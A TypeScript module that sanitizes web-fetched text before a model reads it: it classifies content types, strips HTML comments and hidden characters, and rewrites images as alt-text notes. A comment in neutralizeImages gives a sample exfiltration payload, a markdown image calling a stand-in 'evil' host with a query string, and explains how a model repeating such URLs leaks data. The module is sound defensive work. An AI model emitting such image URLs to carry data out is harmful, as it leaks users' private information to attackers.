/**
 * Clean and classify text fetched from the web before a model reads it
 * (plans/research/web-search-and-fetch.md, gaps G2, G7, G8). Pure.
 */

import { stripHiddenCharacters } from "./hiddenCharacters";

/** Name of the note item that says a fetched page was cut (by bytes or by characters). */
export const TRUNCATION_ITEM_NAME = "Truncation warning";

export type BodyKind = "html" | "json" | "text" | "binary" | "unknown";

export function mediaType(contentType: string | null | undefined): string {
  return (contentType ?? "").split(";")[0].trim().toLowerCase();
}

/**
 * What a `Content-Type` says the body is. HTML goes through the article
 * extractor; JSON and the text family are returned as text; everything else
 * (images, PDF, archives, `application/octet-stream`) is binary. An absent
 * type is `unknown` and is decided from the body.
 */
export function classifyContentType(
  contentType: string | null | undefined,
): BodyKind {
  const type = mediaType(contentType);
  if (!type) return "unknown";
  // Including image/svg+xml, which is XML but not something to read as text
  if (/^(image|audio|video|font)\//.test(type)) return "binary";
  if (type === "text/html" || type === "application/xhtml+xml") return "html";
  if (
    type === "application/json" ||
    type === "text/json" ||
    type.endsWith("+json")
  ) {
    return "json";
  }
  if (
    type.startsWith("text/") ||
    type === "application/xml" ||
    type.endsWith("+xml") ||
    type === "application/javascript" ||
    type === "application/x-yaml" ||
    type === "application/yaml" ||
    type === "application/toml" ||
    type === "application/x-ndjson"
  ) {
    return "text";
  }
  return "binary";
}

/** Decide a body whose response named no type. */
export function sniffBody(text: string): Exclude<BodyKind, "unknown"> {
  if (text.slice(0, 2000).includes("\u0000")) return "binary";
  if (/^\s*(<!doctype\s+html|<html[\s>])/i.test(text)) return "html";
  if (/^\s*[[{]/.test(text)) {
    try {
      JSON.parse(text);
      return "json";
    } catch {
      return "text";
    }
  }
  return "text";
}

/** JSON as indented text; text that is not JSON (a truncated body) is returned as it is. */
export function prettyJson(text: string): string {
  try {
    return JSON.stringify(JSON.parse(text), null, 2);
  } catch {
    return text;
  }
}

/** Remove HTML comments, including one that is never closed. */
export function stripHtmlComments(text: string): string {
  return text.replace(/<!--[\s\S]*?(?:-->|$)/g, "");
}

// The hidden characters are the shared set (hiddenCharacters.ts)
// C0 controls other than tab, line feed and carriage return, and DEL
const CONTROLS = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g;

export function stripInvisible(text: string): string {
  return stripHiddenCharacters(text).replace(CONTROLS, "");
}

function closeOf(text: string, open: number, a: string, b: string): number {
  let depth = 0;
  for (let i = open; i < text.length; i++) {
    const c = text[i];
    if (c === "\\") i++;
    else if (c === a) depth++;
    else if (c === b && --depth === 0) return i;
  }
  return -1;
}

/**
 * Turn markdown and HTML images into `[image: alt]`. A remote image URL in
 * text the model reads is a way to move data out (`![](https://evil/?q=...)`),
 * because the model can repeat the URL in its own message or a tool call.
 */
export function neutralizeImages(text: string): string {
  let out = "";
  let i = 0;
  while (i < text.length) {
    const at = text.indexOf("![", i);
    if (at === -1) break;
    const altEnd = closeOf(text, at + 1, "[", "]");
    let end = -1;
    if (altEnd !== -1) {
      const next = text[altEnd + 1];
      if (next === "(") end = closeOf(text, altEnd + 1, "(", ")");
      else if (next === "[") end = closeOf(text, altEnd + 1, "[", "]");
    }
    if (end === -1) {
      out += text.slice(i, at + 2);
      i = at + 2;
      continue;
    }
    out += text.slice(i, at) + imageNote(text.slice(at + 2, altEnd));
    i = end + 1;
  }
  out += text.slice(i);
  return out.replace(/<img\b[^>]*>/gi, (tag) => {
    const alt = /\balt\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/i.exec(tag);
    return imageNote(alt?.[1] ?? alt?.[2] ?? alt?.[3] ?? "");
  });
}

function imageNote(alt: string): string {
  const clean = alt.replace(/\s+/g, " ").trim().slice(0, 200);
  return clean ? `[image: ${clean}]` : "[image]";
}

/** The cleaning every fetched page or text body gets, in the order that matters. */
export function sanitizeFetchedText(text: string): string {
  return neutralizeImages(stripInvisible(stripHtmlComments(text)));
}
